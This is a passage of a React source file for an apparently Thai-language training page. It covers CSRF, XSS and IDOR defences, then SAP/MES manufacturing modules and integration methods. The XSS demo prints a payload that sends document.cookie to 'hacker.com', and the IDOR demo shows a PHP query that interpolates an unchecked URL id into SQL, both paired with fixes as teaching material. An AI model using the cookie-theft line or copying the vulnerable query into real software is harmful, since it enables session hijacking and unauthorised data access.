        <span className="c-fn">exit</span>(<span className="c-fn">json_encode</span>([<span className="c-str">'success'</span> =&gt; <span className="c-kw">false</span>, <span className="c-str">'message'</span> =&gt; <span className="c-str">'CSRF token mismatch'</span>]));
    }
}</div>

              <div className="hub-h4" style={{ color: 'var(--cyan)', marginTop: '14px' }}>React &mdash; ส่ง Token ทุก API Call ผ่าน Axios</div>
              <div className="hub-code"><span className="code-label">JSX / Axios</span><span className="c-cm">// อ่าน token จาก meta tag ที่ PHP render ไว้ใน &lt;head&gt;</span>
<span className="c-kw">const</span> <span className="c-var">csrfToken</span> = <span className="c-fn">document</span>.<span className="c-fn">querySelector</span>(<span className="c-str">'meta[name="csrf-token"]'</span>)?.<span className="c-var">content</span>;

<span className="c-cm">// ตั้งค่า Global ครั้งเดียวใน main.jsx</span>
axios.defaults.headers.common[<span className="c-str">'X-CSRF-TOKEN'</span>] = <span className="c-var">csrfToken</span>;

<span className="c-cm">// ทุก API call ส่ง Token อัตโนมัติ ไม่ต้องเขียนซ้ำ</span>
<span className="c-kw">await</span> axios.<span className="c-fn">post</span>(<span className="c-str">'/api/orders/delete'</span>, { order_id: <span className="c-num">2001</span> });</div>

              <div className="hub-alert hub-alert-warn" style={{ marginTop: '14px' }}><span className="hub-alert-icon">&#9888;</span><div><strong>ข้อควรระวัง — Timing Attack:</strong> ใช้ <span className="step-code-inline">hash_equals()</span> แทน <span className="step-code-inline">===</span> เสมอ เพราะ <span className="step-code-inline">===</span> ใช้เวลาน้อยลงเมื่อ String ตรงกันตั้งแต่ต้น ทำให้ Hacker เดา Token ได้ทีละตัว ส่วน <span className="step-code-inline">hash_equals()</span> ใช้เวลาเท่ากันเสมอ</div></div>

            </div></div>
          </div>

          <div className="detail-panel" id="hs3">
            <div className="detail-header" onClick={() => { togglePanel('hs3') }}><h3><span className="hchip hchip-amber">MEDIUM</span>{'\u00A0'} XSS — Cross-Site Scripting</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-alert hub-alert-warn"><span className="hub-alert-icon">&#9888;</span><div><strong>การโจมตี:</strong> ฝัง Script เช่น &lt;script&gt;document.cookie&lt;/script&gt; ลงในข้อมูล ทำให้รัน code บน Browser ของ user คนอื่น</div></div>

              <div className="csrf-view-toggle">
                <button className="csrf-view-btn atk-active" id="xssBtnAtk" onClick={() => { genShowView('xss','atk') }}>&#128308; จำลองการโจมตี</button>
                <button className="csrf-view-btn" id="xssBtnDef" onClick={() => { genShowView('xss','def') }}>&#128994; การป้องกัน</button>
              </div>
              <div className="csrf-scene show" id="xssAtk">
                <div className="anim-layer"></div>
                <div className="csrf-actors">
                  <div className="csrf-actor" id="actor_xssAtk_1"><div className="csrf-actor-icon">&#128520;</div><div className="csrf-actor-label label-bad">Hacker</div></div>
                  <div className="csrf-actor" id="actor_xssAtk_2"><div className="csrf-actor-icon">&#128187;</div><div className="csrf-actor-label">PHP Server</div></div>
                  <div className="csrf-actor" id="actor_xssAtk_3"><div className="csrf-actor-icon">&#129489;</div><div className="csrf-actor-label">Victim</div></div>
                  <div className="csrf-actor" id="actor_xssAtk_4"><div className="csrf-actor-icon">&#127760;</div><div className="csrf-actor-label">Browser</div></div>
                </div>
                <div className="csrf-steps">
                  <div className="csrf-step-item step-atk" id="xssA1"><div className="step-num step-num-atk">1</div><div className="step-text">&#128520; <strong>Hacker Input</strong> — กรอก Script เข้าไปในแบบฟอร์ม:<div className="csrf-inset-code" style={{ color: '#fca5a5' }}>&lt;script&gt;fetch('hacker.com?cookie='+document.cookie)&lt;/script&gt;</div></div></div>
                  <div className="csrf-step-item step-atk" id="xssA2"><div className="step-num step-num-atk">2</div><div className="step-text">&#128187; <strong>PHP บันทึกลง Database ตรงๆ</strong> — ไม่ได้กรองข้อมูล</div></div>
                  <div className="csrf-step-item step-atk" id="xssA3"><div className="step-num step-num-atk">3</div><div className="step-text">&#129489; <strong>Victim เปิดดูหน้าเว็บ</strong> — PHP ดึงข้อมูลจาก DB มาแสดงโดยไม่ทำ htmlspecialchars</div></div>
                  <div className="csrf-step-item step-atk" id="xssA4"><div className="step-num step-num-atk">4</div><div className="step-text" style={{ color: 'var(--red)' }}>&#128165; <strong>Browser ของ Victim รัน Script ทันที!</strong><br/><span style={{ color: 'var(--text-dim)' }}>Session Cookie ถูกส่งไปหา Hacker. Hacker เอา Cookie ไปสวมรอยเป็น Victim ได้เลย</span></div></div>
                </div>
                <div className="csrf-ctrl">
                  <button className="csrf-ctrl-auto" onClick={() => { toggleAutoPlay('xss','atk') }}>&#9654; Auto-play</button>
                  <button className="csrf-ctrl-btn atk-ctrl" id="xssNextBtnAtk" onClick={() => { genStep('xss','atk') }}>&#9654; แสดงขั้นตอนถัดไป</button>
                  <button className="csrf-ctrl-reset" onClick={() => { genReset('xss','atk') }}>&#8635; เริ่มใหม่</button>
                  <span className="csrf-prog" id="xssProgAtk">0 / 4 ขั้นตอน</span>
                </div>
              </div>
              
              <div className="csrf-scene" id="xssDef">
                <div className="anim-layer"></div>
                <div className="csrf-actors">
                  <div className="csrf-actor" id="actor_xssDef_1"><div className="csrf-actor-icon">&#128520;</div><div className="csrf-actor-label label-bad">Hacker</div></div>
                  <div className="csrf-actor" id="actor_xssDef_2"><div className="csrf-actor-icon">&#128187;</div><div className="csrf-actor-label">PHP Server</div></div>
                  <div className="csrf-actor" id="actor_xssDef_3"><div className="csrf-actor-icon">&#129489;</div><div className="csrf-actor-label">Victim</div></div>
                  <div className="csrf-actor" id="actor_xssDef_4"><div className="csrf-actor-icon">&#127760;</div><div className="csrf-actor-label">Browser</div></div>
                </div>
                <div className="csrf-steps">
                  <div className="csrf-step-item step-def" id="xssD1"><div className="step-num step-num-def">1</div><div className="step-text">&#128520; <strong>Hacker Input</strong> — กรอก Script เข้าไปในแบบฟอร์ม:<div className="csrf-inset-code" style={{ color: '#fca5a5' }}>&lt;script&gt;fetch('hacker.com')&lt;/script&gt;</div></div></div>
                  <div className="csrf-step-item step-def" id="xssD2"><div className="step-num step-num-def">2</div><div className="step-text">&#128187; <strong>PHP บันทึกลง Database ตรงๆ</strong></div></div>
                  <div className="csrf-step-item step-def" id="xssD3"><div className="step-num step-num-def">3</div><div className="step-text">&#129489; <strong>Victim เปิดดูหน้าเว็บ</strong> — ครั้งนี้ React นำข้อมูลมาแสดงผลด้วย `{userInput}`</div></div>
                  <div className="csrf-step-item step-def" id="xssD4"><div className="step-num step-num-def">4</div><div className="step-text" style={{ color: 'var(--green)' }}>&#10003; <strong>React ป้องกันด้วย Auto-Escaping ทันที!</strong><br/><span style={{ color: 'var(--text-dim)' }}>โค้ดถูกแปลงเป็น Text ธรรมดา &amp;lt;script&amp;gt; ไม่ถูกรันบน Browser เด็ดขาด</span></div></div>
                </div>
                <div className="csrf-ctrl">
                  <button className="csrf-ctrl-auto" onClick={() => { toggleAutoPlay('xss','def') }}>&#9654; Auto-play</button>
                  <button className="csrf-ctrl-btn def-ctrl" id="xssNextBtnDef" onClick={() => { genStep('xss','def') }}>&#9654; แสดงขั้นตอนถัดไป</button>
                  <button className="csrf-ctrl-reset" onClick={() => { genReset('xss','def') }}>&#8635; เริ่มใหม่</button>
                  <span className="csrf-prog" id="xssProgDef">0 / 4 ขั้นตอน</span>
                </div>
              </div>

              <div className="hub-two">
                <div><div className="hub-h4" style={{ color: 'var(--amber)' }}>PHP — htmlspecialchars()</div><div className="hub-code"><span className="c-kw">echo</span> <span className="c-fn">htmlspecialchars</span>(
  <span className="c-var">$data</span>[<span className="c-str">'username'</span>],
  ENT_QUOTES, <span className="c-str">'UTF-8'</span>
);
<span className="c-cm">// &lt;script&gt; => &amp;lt;script&amp;gt;</span></div></div>
                <div><div className="hub-h4" style={{ color: 'var(--green)' }}>React — Auto-Escaping</div><div className="hub-code"><span className="c-kw">const</span> <span className="c-var">userInput</span> = <span className="c-str">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>;
<span className="c-cm">// SAFE: แสดงเป็นข้อความ ไม่รัน</span>
<span className="c-kw">return</span> &lt;<span className="c-fn">div</span>&gt;{<span className="c-var">userInput</span>}&lt;/<span className="c-fn">div</span>&gt;;
<span className="c-cm">// อย่าใช้ dangerouslySetInnerHTML!</span></div></div>
              </div>
            </div></div>
          </div>

          <div className="detail-panel" id="hs4">
            <div className="detail-header" onClick={() => { togglePanel('hs4') }}><h3><span className="hchip hchip-amber">MEDIUM</span>{'\u00A0'} IDOR — Insecure Direct Object References (จำลองการโจมตี)</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-alert hub-alert-warn"><span className="hub-alert-icon">&#9888;</span><div><strong>แก่นของปัญหา:</strong> Server เชื่อ ID ที่ส่งมาใน URL โดยไม่ตรวจว่า User <strong>มีสิทธิ์</strong> เข้าถึง Record นั้นจริงไหม</div></div>
              <div className="csrf-view-toggle">
                <button className="csrf-view-btn atk-active" id="idorBtnAtk" onClick={() => { genShowView('idor','atk') }}>&#128308; จำลองการโจมตี</button>
                <button className="csrf-view-btn" id="idorBtnDef" onClick={() => { genShowView('idor','def') }}>&#128994; การป้องกัน</button>
              </div>
              <div className="csrf-scene show" id="idorAtk">
                <div className="anim-layer"></div>
                <div className="csrf-actors">
                  <div className="csrf-actor" id="actor_idorAtk_1"><div className="csrf-actor-icon">&#128520;</div><div className="csrf-actor-label label-bad">Hacker (UserA)</div></div>
                  <div className="csrf-actor" id="actor_idorAtk_2"><div className="csrf-actor-icon">&#127760;</div><div className="csrf-actor-label">Browser</div></div>
                  <div className="csrf-actor" id="actor_idorAtk_3"><div className="csrf-actor-icon">&#128187;</div><div className="csrf-actor-label">PHP API</div></div>
                  <div className="csrf-actor" id="actor_idorAtk_4"><div className="csrf-actor-icon">&#128451;</div><div className="csrf-actor-label">Database</div></div>
                </div>
                <div className="csrf-steps">
                  <div className="csrf-step-item step-atk" id="idorA1"><div className="step-num step-num-atk">1</div><div className="step-text">&#128520; <strong>Hacker Login เป็น UserA</strong> — มีสิทธิ์ดูแค่ Line A เท่านั้น แต่เห็น URL:<div className="csrf-inset-code" style={{ color: '#fca5a5' }}>GET /api/orders?id=1001  ← order ของตัวเอง</div></div></div>
                  <div className="csrf-step-item step-atk" id="idorA2"><div className="step-num step-num-atk">2</div><div className="step-text">&#127760; <strong>Hacker แก้ id เป็น 1002 ใน Browser</strong>:<div className="csrf-inset-code" style={{ color: '#f87171' }}>GET /api/orders?id=1002  ← order ของ Line B (UserB)</div></div></div>
                  <div className="csrf-step-item step-atk" id="idorA3"><div className="step-num step-num-atk">3</div><div className="step-text">&#128187; <strong>PHP ไม่ตรวจสิทธิ์</strong> — รัน Query ตรงๆ:<div className="csrf-inset-code" style={{ color: '#f87171' }}>$id = $_GET['id'];  // = 1002
$data = DB::query("SELECT * FROM orders WHERE id=$id");</div></div></div>
                  <div className="csrf-step-item step-atk" id="idorA4"><div className="step-num step-num-atk">4</div><div className="step-text" style={{ color: 'var(--red)' }}>&#128165; <strong>ส่งข้อมูล Order 1002 ของ UserB กลับมา!</strong><br/><span style={{ color: 'var(--text-dim)' }}>Hacker เห็น ราคา, ปริมาณ, ข้อมูลลับของสายการผลิตอื่น</span></div></div>
                </div>
                <div className="csrf-ctrl">
                  <button className="csrf-ctrl-auto" onClick={() => { toggleAutoPlay('idor','atk') }}>&#9654; Auto-play</button>
                  <button className="csrf-ctrl-btn atk-ctrl" id="idorNextBtnAtk" onClick={() => { genStep('idor','atk') }}>&#9654; แสดงขั้นตอนถัดไป</button>
                  <button className="csrf-ctrl-reset" onClick={() => { genReset('idor','atk') }}>&#8635; เริ่มใหม่</button>
                  <span className="csrf-prog" id="idorProgAtk">0 / 4 ขั้นตอน</span>
                </div>
              </div>
              <div className="csrf-scene" id="idorDef">
                <div className="anim-layer"></div>
                <div className="csrf-actors">
                  <div className="csrf-actor" id="actor_idorDef_1"><div className="csrf-actor-icon">&#128520;</div><div className="csrf-actor-label label-bad">Hacker (UserA)</div></div>
                  <div className="csrf-actor" id="actor_idorDef_2"><div className="csrf-actor-icon">&#127760;</div><div className="csrf-actor-label">Browser</div></div>
                  <div className="csrf-actor" id="actor_idorDef_3"><div className="csrf-actor-icon">&#128187;</div><div className="csrf-actor-label label-good">PHP + Permission</div></div>
                  <div className="csrf-actor" id="actor_idorDef_4"><div className="csrf-actor-icon">&#128451;</div><div className="csrf-actor-label label-good">Database</div></div>
                </div>
                <div className="csrf-steps">
                  <div className="csrf-step-item step-def" id="idorD1"><div className="step-num step-num-def">1</div><div className="step-text">&#128520; Hacker ส่ง <span className="step-code-inline">GET /api/orders?id=1002</span> เหมือนเดิม — Server รู้ว่า User นี้คือ <span className="step-code-inline">UserA</span> จาก Session</div></div>
                  <div className="csrf-step-item step-def" id="idorD2"><div className="step-num step-num-def">2</div><div className="step-text">&#128187; <strong>PHP ตรวจสิทธิ์ก่อนทุกครั้ง:</strong><div className="csrf-inset-code" style={{ color: '#6ee7b7' }}>enforceRecordPermission(
  $pdo, 'orders', $id=1002, 'id', 'owner_line'
);
// Query: SELECT owner_line FROM orders WHERE id=1002</div></div></div>
                  <div className="csrf-step-item step-def" id="idorD3"><div className="step-num step-num-def">3</div><div className="step-text">&#128451; <strong>Database ตอบ: owner_line = 'LINE-B'</strong><br/>PHP เปรียบเทียบ: <span className="step-code-inline">UserA.line ('LINE-A') !== 'LINE-B'</span> → ไม่มีสิทธิ์!</div></div>
                  <div className="csrf-step-item step-def" id="idorD4"><div className="step-num step-num-def">4</div><div className="step-text" style={{ color: 'var(--green)' }}>&#10003; <strong>Throw 403 Forbidden — ไม่ส่งข้อมูลใดๆ!</strong><br/><span style={{ color: 'var(--text-dim)' }}>Hacker ได้รับแค่ error message — ข้อมูล Line B ปลอดภัย</span></div></div>
                </div>
                <div className="csrf-ctrl">
                  <button className="csrf-ctrl-auto" onClick={() => { toggleAutoPlay('idor','def') }}>&#9654; Auto-play</button>
                  <button className="csrf-ctrl-btn def-ctrl" id="idorNextBtnDef" onClick={() => { genStep('idor','def') }}>&#9654; แสดงขั้นตอนถัดไป</button>
                  <button className="csrf-ctrl-reset" onClick={() => { genReset('idor','def') }}>&#8635; เริ่มใหม่</button>
                  <span className="csrf-prog" id="idorProgDef">0 / 4 ขั้นตอน</span>
                </div>
              </div>
              <div className="insight-box"><span className="insight-icon">&#128161;</span><div><strong>หลักการ:</strong> อย่า trust ID ที่ส่งมาใน URL — ต้องตรวจเสมอว่า User ที่ Login อยู่ <strong>เป็นเจ้าของ</strong> Record นั้นจริงไหม ก่อนส่งข้อมูลกลับ</div></div>
            </div></div>
          </div>
        </div>

        
        <div className="hub-section" id="herp">
          <div className="progress-track"><div className="progress-fill" style={{ width: '100%' }}></div></div>
          <div className="hub-section-header">
            <div className="hub-section-title"><div className="hub-icon-box" style={{ background: 'rgba(251,191,36,0.08)', border: '1px solid rgba(251,191,36,0.18)' }}>&#128230;</div>Enterprise Modules — SAP &amp; MES</div>
            <p className="hub-section-desc">โมดูลธุรกิจ 4 ระบบหลัก — PP, MM, PM, QM คลิกการ์ดเพื่อดูรายละเอียด</p>
          </div>
          <div className="hub-card-grid">
            <div className="hub-card" style={{ '--card-color': 'var(--blue)' }} onClick={() => { togglePanel('he1') }}><div className="hub-card-label">Module PP</div><h3>&#127981; Production Planning</h3><p>วางแผนและควบคุมการผลิต บันทึกยอดผลิตจริง</p><div className="hub-tags"><span className="hub-tag">Production Order</span><span className="hub-tag">BOM</span><span className="hub-tag">Routing</span><span className="hub-tag">Confirmation</span></div></div>
            <div className="hub-card" style={{ '--card-color': 'var(--green)' }} onClick={() => { togglePanel('he2') }}><div className="hub-card-label">Module MM</div><h3>&#128203; Materials Management</h3><p>จัดการวัสดุและคลังสินค้า ติดตาม Stock เคลื่อนไหว</p><div className="hub-tags"><span className="hub-tag">Material Master</span><span className="hub-tag">Goods Receipt</span><span className="hub-tag">Goods Issue</span></div></div>
            <div className="hub-card" style={{ '--card-color': 'var(--amber)' }} onClick={() => { togglePanel('he3') }}><div className="hub-card-label">Module PM</div><h3>&#128295; Plant Maintenance</h3><p>บันทึก Downtime และการแจ้งซ่อมเครื่องจักร</p><div className="hub-tags"><span className="hub-tag">Notification</span><span className="hub-tag">Downtime</span><span className="hub-tag">Work Order</span></div></div>
            <div className="hub-card" style={{ '--card-color': 'var(--red)' }} onClick={() => { togglePanel('he4') }}><div className="hub-card-label">Module QM</div><h3>&#10003; Quality Management</h3><p>บันทึก Defect และ Quality Notification</p><div className="hub-tags"><span className="hub-tag">Inspection Lot</span><span className="hub-tag">Quality Notification</span><span className="hub-tag">Defect Recording</span></div></div>
          </div>
          <div className="detail-panel" id="he1">
            <div className="detail-header" onClick={() => { togglePanel('he1') }}><h3><span className="hchip hchip-blue">PP</span>{'\u00A0'} Production Planning — รายละเอียด</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-diagram"><div className="hub-diagram-title">PP Workflow</div><div className="hflow-row"><span className="hbox hbox-blue">Production Order<br/><small style={{ fontWeight: '400', fontSize: '10px' }}>ใบสั่งผลิต</small></span><span className="harrow">--&gt;</span><span className="hbox hbox-blue">BOM<br/><small style={{ fontWeight: '400', fontSize: '10px' }}>สูตรการผลิต</small></span><span className="harrow">--&gt;</span><span className="hbox hbox-blue">Routing<br/><small style={{ fontWeight: '400', fontSize: '10px' }}>เครื่องจักร</small></span><span className="harrow">--&gt;</span><span className="hbox hbox-green">Confirmation<br/><small style={{ fontWeight: '400', fontSize: '10px' }}>ยืนยันยอด</small></span></div></div>
              <table className="hub-table"><thead><tr><th>คำศัพท์</th><th>ความหมาย</th><th>ตัวอย่าง</th></tr></thead><tbody><tr><td>BOM</td><td>รายการวัตถุดิบที่ต้องใช้ 1 หน่วย</td><td>เหล็ก 2mm &times; 150g + น็อต 4 ตัว</td></tr><tr><td>Routing</td><td>ลำดับเครื่องจักรที่ต้องผ่าน</td><td>Laser Cut &rarr; Press &rarr; Weld &rarr; Paint</td></tr><tr><td>Confirmation</td><td>บันทึกยอดผลิตจริง (ดี + เสีย)</td><td>ดี: 488 ชิ้น, Scrap: 12 ชิ้น</td></tr></tbody></table>
              <div className="hub-alert hub-alert-warn" style={{ marginBottom: '12px' }}><span className="hub-alert-icon">&#9888;</span><div><strong>กฎอุตสาหกรรมเหล็ก (UOM & Precision):</strong> ต้องใช้ทศนิยมอย่างน้อย 3 ตำแหน่ง <span className="step-code-inline">DECIMAL(10,3)</span> และแยกยอด "ของดี" (Good Qty) กับ "ของเสีย/เศษเหล็ก" (Scrap Weight) ออกจากกันอย่างชัดเจน</div></div>
              <div className="hub-code"><span className="code-label">SQL Server (SP)</span><span className="c-kw">EXEC</span> <span className="c-fn">SP_EXECUTE_PRODUCTION</span>
    @job_order_id = <span className="c-num">2001</span>,
    @good_qty     = <span className="c-num">488.000</span>, <span className="c-cm">-- UOM: PCS</span>
    @scrap_weight = <span className="c-num">2.400</span>, <span className="c-cm">-- UOM: KG (เศษเหล็กที่ตัดทิ้ง)</span>
    @machine_id   = <span className="c-str">'PRESS-01'</span>;</div>
              <div className="insight-box" style={{ marginTop: '16px' }}><span className="insight-icon">&#128269;</span><div><strong>Traceability & Genealogy:</strong> การสืบย้อนกลับเป็นหัวใจสำคัญ หากพบชิ้นงานมีปัญหา ต้องสามารถตรวจสอบกลับไปได้ว่าผลิตจากเหล็กคอยล์ (Coil Lot Number) ล็อตไหน เพื่อแจ้งเคลม Supplier ได้ทันที</div></div>
            </div></div>
          </div>
          <div className="detail-panel" id="he2">
            <div className="detail-header" onClick={() => { togglePanel('he2') }}><h3><span className="hchip hchip-green">MM</span>{'\u00A0'} Materials Management — รายละเอียด</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-two">
                <div><div className="hub-h4" style={{ color: 'var(--green)' }}>Goods Receipt (รับวัสดุเข้า)</div><ul className="hub-list"><li>รับเหล็กแผ่น/คอยล์จากซัพพลายเออร์</li><li>บันทึก Lot Number สำหรับ Traceability</li><li>เพิ่ม Stock ใน ONHAND_TABLE</li></ul></div>
                <div><div className="hub-h4" style={{ color: 'var(--amber)' }}>Goods Issue (เบิกวัสดุออก)</div><ul className="hub-list"><li>เบิกวัตถุดิบตาม BOM</li><li>ตัด Stock อัตโนมัติ (Backflush)</li><li><strong>Parent-Child Relationship:</strong> เมื่อนำเหล็กม้วน (Parent) มาตัดแบ่ง ต้องสร้างเลข Lot ใหม่ (Child) และผูกความสัมพันธ์กันเสมอ</li></ul></div>
              </div>
              <div className="hub-alert hub-alert-danger" style={{ marginTop: '16px' }}><span className="hub-alert-icon">&#128246;</span><div><strong>Hardware Integration:</strong> หน้าจอ React ที่รับค่าจากการยิง Barcode Scanner ต้องมี <strong>Debounce Logic</strong> และบล็อกปุ่ม Submit ทันที (Anti-Double Submit) ป้องกันพนักงานยิงเบิ้ลจน Stock ตัดเกินจริง</div></div>
            </div></div>
          </div>
          <div className="detail-panel" id="he3">
            <div className="detail-header" onClick={() => { togglePanel('he3') }}><h3><span className="hchip hchip-amber">PM</span>{'\u00A0'} Plant Maintenance — รายละเอียด</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-diagram"><div className="hub-diagram-title">PM Downtime Flow</div><div className="hflow-row"><span className="hbox hbox-amber">เครื่องหยุด</span><span className="harrow">--&gt;</span><span className="hbox hbox-amber">แจ้งซ่อม</span><span className="harrow">--&gt;</span><span className="hbox hbox-blue">บันทึก Downtime</span><span className="harrow">--&gt;</span><span className="hbox hbox-green">ซ่อมเสร็จ</span></div></div>
              <table className="hub-table"><thead><tr><th>ข้อมูล</th><th>รายละเอียด</th></tr></thead><tbody><tr><td>Machine ID</td><td>รหัสเครื่องจักรที่เสีย เช่น PRESS-01</td></tr><tr><td>Downtime Type</td><td>Breakdown, Planned Maintenance, Setup</td></tr><tr><td>Root Cause</td><td>Mechanical, Electrical, Operator Error</td></tr></tbody></table>
              <div className="insight-box" style={{ marginTop: '16px', background: 'rgba(245,158,11,0.06)', borderColor: 'rgba(245,158,11,0.2)' }}><span className="insight-icon" style={{ color: 'var(--amber)' }}>&#9881;&#65039;</span><div><strong>Machine Parameter Integration:</strong> ไม่ต้องรอให้พนักงานกดแจ้งเครื่องเสีย! เราใช้ <strong>Node-RED</strong> เชื่อมต่อ PLC แบบ Real-time (ผ่าน OPC UA) เพื่อมอนิเตอร์ แรงกด, กระแสไฟ, อุณหภูมิ หากค่าตกเกิน Threshold ให้ทริกเกอร์ Downtime ลง Database ทันที</div></div>
            </div></div>
          </div>
          <div className="detail-panel" id="he4">
            <div className="detail-header" onClick={() => { togglePanel('he4') }}><h3><span className="hchip hchip-red">QM</span>{'\u00A0'} Quality Management — รายละเอียด</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-two">
                <div><div className="hub-h4" style={{ color: 'var(--red)' }}>ประเภท Defect</div><ul className="hub-list"><li>Dimensional — ขนาดไม่ตรงสเปก</li><li>Surface — รอยขีดข่วน, สนิม</li><li>Weld — รอยเชื่อมไม่สมบูรณ์</li><li>Paint — สีไม่ติด, ฟอง</li></ul></div>
                <div><div className="hub-h4" style={{ color: 'var(--amber)' }}>Quality Notification & Action</div><ul className="hub-list"><li>สร้าง QN เมื่อของเสีย (Scrap) เกิน Threshold</li><li>แจ้งเตือน QC Supervisor ผ่าน Web Socket ทันที</li><li>ดึงข้อมูลน้ำหนักทฤษฎี (Theoretical) มาเทียบกับน้ำหนักจริง (Actual) เพื่อหาสาเหตุ</li></ul></div>
              </div>
            </div></div>
          </div>
        </div>

        
        <div className="hub-section" id="hint">
          <div className="progress-track"><div className="progress-fill" style={{ width: '100%' }}></div></div>
          <div className="hub-section-header">
            <div className="hub-section-title"><div className="hub-icon-box" style={{ background: 'rgba(167,139,250,0.08)', border: '1px solid rgba(167,139,250,0.2)' }}>&#128279;</div>Integration Technologies</div>
            <p className="hub-section-desc">4 วิธีการเชื่อมต่อ MES กับ SAP — แต่ละแบบมีจุดเด่นและข้อจำกัดต่างกัน</p>
          </div>

          <div className="detail-panel open" id="hi0">
            <div className="detail-header" onClick={() => { togglePanel('hi0') }}><h3><span className="hchip hchip-purple">Overview</span>{'\u00A0'} ภาพรวมการเชื่อมต่อ MES &harr; SAP</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-diagram">
                <div style={{ display: 'grid', gridTemplateColumns: '1fr auto 1fr', gap: '16px', alignItems: 'start' }}>
                  <div style={{ textAlign: 'center' }}><div className="hbox hbox-blue" style={{ display: 'flex', justifyContent: 'center', marginBottom: '10px' }}>MES System</div><div style={{ fontSize: '11px', color: 'var(--text-dim)', lineHeight: '2' }}>React 19 Frontend<br/>PHP API Gateway<br/>SQL Server 2016</div></div>
                  <div style={{ textAlign: 'center', paddingTop: '6px' }}>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      <div className="hbox hbox-purple" style={{ fontSize: '11px', justifyContent: 'center' }}>&#9312; Middleware BTP/PI</div>
                      <div className="hbox hbox-blue" style={{ fontSize: '11px', justifyContent: 'center' }}>&#9313; BAPI / RFC</div>
                      <div className="hbox hbox-amber" style={{ fontSize: '11px', justifyContent: 'center' }}>&#9314; Staging Table</div>
                      <div className="hbox hbox-green" style={{ fontSize: '11px', justifyContent: 'center' }}>&#9315; Message Queue</div>
                    </div>
                  </div>
                  <div style={{ textAlign: 'center' }}><div className="hbox hbox-amber" style={{ display: 'flex', justifyContent: 'center', marginBottom: '10px' }}>SAP ERP</div><div style={{ fontSize: '11px', color: 'var(--text-dim)', lineHeight: '2' }}>PP Module<br/>MM Module<br/>PM / QM Module</div></div>
                </div>
              </div>
            </div></div>
          </div>

          <div className="detail-panel" id="hi1">
            <div className="detail-header" onClick={() => { togglePanel('hi1') }}><h3><span className="hchip hchip-purple">วิธีที่ 1</span>{'\u00A0'} Middleware — SAP BTP / PI/PO</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-diagram"><div className="hub-diagram-title">Middleware Pattern</div><div className="hflow-row"><span className="hbox hbox-blue">MES (JSON)</span><span className="harrow">--&gt;</span><span className="hbox hbox-purple">SAP BTP/PI<br/><small style={{ fontWeight: '400', fontSize: '10px' }}>Transform+Route</small></span><span className="harrow">--&gt;</span><span className="hbox hbox-amber">SAP (IDOC/RFC)</span></div></div>
              <div className="hub-two">
                <div><div className="hub-h4" style={{ color: 'var(--green)' }}>ข้อดี</div><ul className="hub-list"><li>มาตรฐานสูง — SAP Official</li><li>Monitoring ครบ</li><li>รองรับ Protocol หลากหลาย</li></ul></div>
                <div><div className="hub-h4" style={{ color: 'var(--red)' }}>ข้อเสีย</div><ul className="hub-list"><li>ค่าใช้จ่ายสูง (License)</li><li>ต้องการทีม SAP Basis</li><li>Setup ซับซ้อน</li></ul></div>
              </div>
            </div></div>
          </div>

          <div className="detail-panel" id="hi2">
            <div className="detail-header" onClick={() => { togglePanel('hi2') }}><h3><span className="hchip hchip-blue">วิธีที่ 2</span>{'\u00A0'} BAPI / RFC — เรียกฟังก์ชัน SAP โดยตรง</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <p style={{ color: 'var(--text-dim)', fontSize: '13px', marginBottom: '12px' }}>BAPI คือฟังก์ชัน SAP ที่ expose ออกมาให้ระบบภายนอกเรียกได้ผ่าน RFC (Remote Function Call)</p>
              <div className="hub-code"><span className="code-label">Python pyrfc</span><span className="c-kw">import</span> pyrfc
conn = pyrfc.<span className="c-fn">Connection</span>(ashost=<span className="c-str">'sap-srv'</span>, client=<span className="c-str">'100'</span>, user=<span className="c-str">'MES_USER'</span>, passwd=<span className="c-str">'***'</span>)
result = conn.<span className="c-fn">call</span>(<span className="c-str">'BAPI_GOODSMVT_CREATE'</span>,
    GOODSMVT_CODE={<span className="c-str">'GM_CODE'</span>: <span className="c-str">'01'</span>},
    GOODSMVT_ITEM=[{
        <span className="c-str">'MATERIAL'</span>:  <span className="c-str">'STEEL-2MM-001'</span>,
        <span className="c-str">'ENTRY_QNT'</span>: <span className="c-num">488.000</span>,
        <span className="c-str">'MOVE_TYPE'</span>: <span className="c-str">'261'</span>  <span className="c-cm"># Goods Issue</span>
    }]
)</div>
              <div className="hub-alert hub-alert-info"><span className="hub-alert-icon">&#8505;</span><div>BAPI ที่ใช้บ่อย: BAPI_PRODORD_GET_DETAIL, BAPI_GOODSMVT_CREATE, BAPI_QUALNOT_CREATE</div></div>
            </div></div>
          </div>

          <div className="detail-panel" id="hi3">
            <div className="detail-header" onClick={() => { togglePanel('hi3') }}><h3><span className="hchip hchip-amber">วิธีที่ 3</span>{'\u00A0'} Staging Tables — ตารางพักข้อมูลกลาง</h3><span className="chevron">&#9662;</span></div>
            <div className="detail-body"><div className="detail-content">
              <div className="hub-diagram"><div className="hub-diagram-title">Staging Pattern</div><div className="hflow-row"><span className="hbox hbox-blue">MES เขียนข้อมูล</span><span className="harrow">--&gt;</span><span className="hbox hbox-amber">Staging Table<br/><small style={{ fontWeight: '400', fontSize: '10px' }}>STG_PRODUCTION_CONFIRM</small></span><span className="harrow">--&gt;</span><span className="hbox hbox-amber">Batch Job ทุก 15 นาที</span><span className="harrow">--&gt;</span><span className="hbox hbox-amber">SAP / BI</span></div></div>
              <div className="hub-code"><span className="code-label">SQL Schema</span><span className="c-kw">CREATE TABLE</span> STG_PRODUCTION_CONFIRM (
    stg_id        <span className="c-fn">INT</span> <span className="c-kw">IDENTITY PRIMARY KEY</span>,
    job_order_id  <span className="c-fn">INT</span>            <span className="c-kw">NOT NULL</span>,
